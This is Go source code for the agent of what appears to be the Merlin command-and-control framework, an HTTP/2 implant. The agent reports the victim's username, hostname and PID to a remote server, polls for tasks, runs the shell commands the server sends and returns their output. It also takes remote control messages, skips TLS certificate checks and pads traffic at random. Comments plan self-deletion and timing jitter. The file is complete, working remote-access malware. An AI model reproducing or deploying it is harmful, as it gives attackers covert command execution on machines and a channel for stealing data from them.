package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"time"
	"flag"
	"runtime"
	"math/rand"
	"strconv"

	"github.com/fatih/color"
	"github.com/satori/go.uuid"
	"golang.org/x/net/http2"

	"github.com/ne0nd0g/merlin/pkg/messages"
	"github.com/ne0nd0g/merlin/pkg/agent"
)

//GLOBAL VARIABLES
var DEBUG = false
var VERBOSE = false
var RUN = true
var hostUUID = uuid.NewV4()
var URL = "https://127.0.0.1:443/"
var h2Client = getH2WebClient()
var waitTime = 30000 * time.Millisecond
var agentShell = ""
var paddingMax = 4096
var src = rand.NewSource(time.Now().UnixNano())
var version = "nonRelease"
var build = "nonRelease"
var maxRetry = 7
var failedCheckin = 0
var initial = false

//Constants
const (
    letterIdxBits = 6                    // 6 bits to represent a letter index
    letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
    letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
    letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

func main() {

	flag.BoolVar(&VERBOSE, "v", false, "Enable verbose output")
	flag.BoolVar(&DEBUG, "debug", false, "Enable debug output")
	flag.StringVar(&URL, "url", URL, "Full URL for agent to connect to")
	flag.DurationVar(&waitTime, "sleep", 30000 * time.Millisecond, "Time for agent to sleep")
	flag.Usage = usage
	flag.Parse()

	if VERBOSE {
		color.Yellow("[-]Agent version: %s", version)
		color.Yellow("[-]Agent build: %s", build)
	}

	for RUN {
		if initial {
			if VERBOSE {
				color.Yellow("[-]Checking in")
			}
			statusCheckIn(URL, h2Client)
		} else {
			initial = initialCheckIn(URL, h2Client)
			agentInfo(URL, h2Client)
		}
		if failedCheckin == maxRetry {os.Exit(1)}
		if VERBOSE {
			color.Yellow("[-]Sleeping for %s at %s", waitTime.String(), time.Now())
		}
		time.Sleep(waitTime)
	}
}

func initialCheckIn(host string, client *http.Client) bool {
	u, errU := user.Current()
	if errU != nil{
		if DEBUG {
			color.Red("[!]There was an error getting the username")
			color.Red(errU.Error())
		}
	}

	h, errH := os.Hostname()
	if errH != nil{
		if DEBUG {
			color.Red("[!]There was an error getting the hostname")
			color.Red(errH.Error())
		}
	}

	if VERBOSE {
		color.Green("[+]Host Information:")
		color.Green("\tAgent UUID: %s", hostUUID)
		color.Green("\tPlatform: %s", runtime.GOOS)
		color.Green("\tArchitecture: %s", runtime.GOARCH)
		color.Green("\tUser Name: %s", u.Username) //TODO A username like _svctestaccont causes error
		color.Green("\tUser GUID: %s", u.Gid)
		color.Green("\tHostname: %s", h)
		color.Green("\tPID: %d", os.Getpid())
	}

	//JSON "initial" payload object
	i := messages.SysInfo{
		Platform: runtime.GOOS,
		Architecture: runtime.GOARCH,
		UserName: u.Username,
		UserGUID: u.Gid,
		HostName: h,
		Pid: os.Getpid(),
	}

	payload, errP := json.Marshal(i)

	if errP != nil {
		if DEBUG {
			color.Red("[!]There was an error marshaling the JSON object")
			color.Red(errP.Error())
		}
	}

	//JSON message to be sent to the server
	g := messages.Base{
		Version: 1.0,
		ID:      hostUUID,
		Type:    "InitialCheckIn", //Can set this to a constant in messages.go
		Payload: (*json.RawMessage)(&payload),
		Padding: RandStringBytesMaskImprSrc(paddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)
	if VERBOSE {
		color.Yellow("[-]Connecting to web server at %s for initial check in.", host)
	}
	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		failedCheckin += 1
		if DEBUG {
			color.Red("[!]There was an error with the HTTP client while performing a POST:")
			color.Red(err.Error())
		}
		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
		return false
	} else {
		if DEBUG {
			color.Red("[DEBUG]HTTP Response:")
			color.Red("[DEBUG]%s", resp)
		}
		if resp.StatusCode != 200 {
			failedCheckin += 1
			if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
			if DEBUG {
				color.Red("[!]There was an error communicating with the server!")
				color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
			}
			return false
		}
	}
	failedCheckin = 0
	return true
}

func statusCheckIn(host string, client *http.Client) {
	g := messages.Base{
		Version: 1.0,
		ID:      hostUUID,
		Type:    "StatusCheckIn",
		Padding: RandStringBytesMaskImprSrc(paddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)

	if VERBOSE {
		color.Yellow("[-]Connecting to web server at %s for status check in.", host)
	}

	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		if DEBUG{
			color.Red("[!]There was an error with the HTTP Response:")
			color.Red(err.Error()) //On Mac I get "read: connection reset by peer" here but not on other platforms
		}			      //Only does this with a 10s Sleep
		failedCheckin += 1
		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
		return
	}

	if DEBUG {
		color.Red("%s", "[DEBUG]HTTP Response:")
		color.Red("[DEBUG]ContentLength: %d", resp.ContentLength)
		color.Red("[DEBUG]%s", resp)
	}

	if resp.StatusCode != 200 {
		failedCheckin += 1
		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
		if DEBUG {
			color.Red("[!]There was an error communicating with the server!")
			color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
		}
		return
	}

	failedCheckin = 0

	if resp.ContentLength != 0 {
		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
		json.NewDecoder(resp.Body).Decode(&j)

		if DEBUG {
			color.Red("[DEBUG]Agent ID: %s", j.ID)
			color.Red("[DEBUG]Message Type: %s", j.Type)
			color.Red("[DEBUG]Message Payload: %s", j.Payload)
		} else if VERBOSE {
			color.Green("%s Message Type Received!", j.Type)
		}
		switch j.Type{ //TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
		case "CmdPayload":
			var p messages.CmdPayload
			json.Unmarshal(payload, &p)
			stdout, stderr := executeCommand(p) //TODO this needs to be its own routine so the agent can continue to function while it is going

			c := messages.CmdResults{
				Job: p.Job,
				Stdout: stdout,
				Stderr: stderr,
			}

			k, _ := json.Marshal(c)
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "CmdResults",
				Payload: (*json.RawMessage)(&k),
				Padding: RandStringBytesMaskImprSrc(paddingMax),
			}
			b2 := new(bytes.Buffer)
			json.NewEncoder(b2).Encode(g)
			if VERBOSE {
				color.Yellow("Sending response to server: %s", stdout)
			}
			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
			if resp2.StatusCode != 200 {
				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
			}
		case "ServerOk":
			if VERBOSE {
				color.Yellow("[-]Received Server OK, doing nothing")
			}
		case "AgentControl":
			if VERBOSE {
				color.Yellow("[-]Received Agent Control Message")
			}
			var p messages.AgentControl
			json.Unmarshal(payload, &p)

			switch p.Command {
			case "kill":
				if VERBOSE {
					color.Yellow("[-]Received Agent Kill Message")
				}
				os.Exit(0)
			case "sleep":
				if VERBOSE {
					color.Yellow("[-]Setting agent sleep time to %s milliseconds", p.Args)
				}
				t, err := time.ParseDuration(p.Args)
				if err != nil {
					if VERBOSE {
						color.Red("[!]There was an error changing the agent waitTime")
						color.Red(err.Error())
					}
				}
				if t > 0 {
					waitTime = t
					agentInfo(host, client)
				} else {
					if VERBOSE {
						color.Red("[!]The agent was provided with a time that was not greater than zero.")
						color.Red("The provided time was: %s", t.String())
					}
				}
			case "padding":
				t, err := strconv.Atoi(p.Args)
				if err != nil {
					if VERBOSE {
						color.Red("[!]There was an error changing the agent message padding size")
					}
				}
				if VERBOSE {
					color.Yellow("[-]Setting agent message maximum padding size to %d", t)
				}
				paddingMax = t
				agentInfo(host, client)
			case "initialize":
				if VERBOSE {
					color.Yellow("[-]Received agent re-initialize message")
				}
				initial = false
			case "maxretry":

				t, err := strconv.Atoi(p.Args)
				if err != nil {
					if VERBOSE {
						color.Red("[!]There was an error changing the agent max retries")
					}
				}
				if VERBOSE {
					color.Yellow("[-]Setting agent max retries to %d", t)
				}
				maxRetry = t
				agentInfo(host, client)
			default:
				if VERBOSE {
					color.Red("[!}Unknown AgentControl message type received %s", p.Command)
				}
			}
		default:
			color.Red("Received unrecognized message type: %s", j.Type)
		}
	}
}

func getH2WebClient() *http.Client {

	//Setup TLS Configuration
	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion:               tls.VersionTLS12,
			InsecureSkipVerify:       true,
			PreferServerCipherSuites: false,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			},
			NextProtos: []string{"h2"},
		},
		DisableCompression: false,
	}

	//Setup HTTP Client Configuration
	client := &http.Client{
		Transport: tr,
	}
	return client
}

func executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
	if DEBUG {
		color.Red("[DEBUG]Received input parameter for executeCommand function: %s", j)

	} else if VERBOSE {
		color.Green("Executing command %s %s %s", agentShell, j.Command, j.Args)
	}

	stdout, stderr = agent.ExecuteCommand(j.Command, j.Args)

	if VERBOSE{
		if stderr != ""{
			color.Red("[!]There was an error executing the command: %s", j.Command)
			color.Green(stdout)
			color.Red("Error: %s", stderr)

		} else {
			color.Green("Command output:\r\n\r\n%s", stdout)
		}
	}

	return stdout, stderr //TODO return if the output was stdout or stderr and color stderr red on server
}

func usage() {
    fmt.Fprintf(os.Stderr, "usage: go run agent -v -debug\n")
    flag.PrintDefaults()
    os.Exit(2)
}

func RandStringBytesMaskImprSrc(n int) string {
	//http://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-golang
    b := make([]byte, n)
    // A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
    for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
        if remain == 0 {
            cache, remain = src.Int63(), letterIdxMax
        }
        if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
            b[i] = letterBytes[idx]
            i--
        }
        cache >>= letterIdxBits
        remain--
    }

    return string(b)
}

func agentInfo(host string, client *http.Client){
	i := messages.AgentInfo{
		Version: version,
		Build: build,
		WaitTime: waitTime.String(),
		PaddingMax: paddingMax,
		MaxRetry: maxRetry,
		FailedCheckin: failedCheckin,
	}

	payload, errP := json.Marshal(i)

	if errP != nil {
		if DEBUG {
			color.Red("[!]There was an error marshaling the JSON object")
			color.Red(errP.Error())
		}
	}

	g := messages.Base{
		Version: 1.0,
		ID:      hostUUID,
		Type:    "AgentInfo",
		Payload: (*json.RawMessage)(&payload),
		Padding: RandStringBytesMaskImprSrc(paddingMax),
	}

	b := new(bytes.Buffer)
	json.NewEncoder(b).Encode(g)
	if VERBOSE {
		color.Yellow("[-]Connecting to web server at %s to update agent configuration information.", host)
	}
	resp, err := client.Post(host, "application/json; charset=utf-8", b)

	if err != nil {
		failedCheckin += 1
		if DEBUG {
			color.Red("[!]There was an error with the HTTP client while performing a POST:")
			color.Red(err.Error())
		}
		if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
		return
	} else {
		if DEBUG {
			color.Red("[DEBUG]HTTP Response:")
			color.Red("[DEBUG]%s", resp)
		}
		if resp.StatusCode != 200 {
			failedCheckin += 1
			if VERBOSE {color.Yellow("[-]%d out of %d total failed checkins", failedCheckin, maxRetry)}
			if DEBUG {
				color.Red("[!]There was an error communicating with the server!")
				color.Red("[!]Received HTTP Status Code: %d", resp.StatusCode)
			}
			return
		}
	}
	failedCheckin = 0
}
/*

1. POST System Enumeration Information and receive back JSON object w/ additional instructions
2. Sleep
3. Check in w/ Server
4. Execute commands if provided by server
5. Return results to server
6. Sleep and Check In
*/

// TODO add cert stapling
// TODO set message jitter
// TODO get and return IP addresses with initial checkin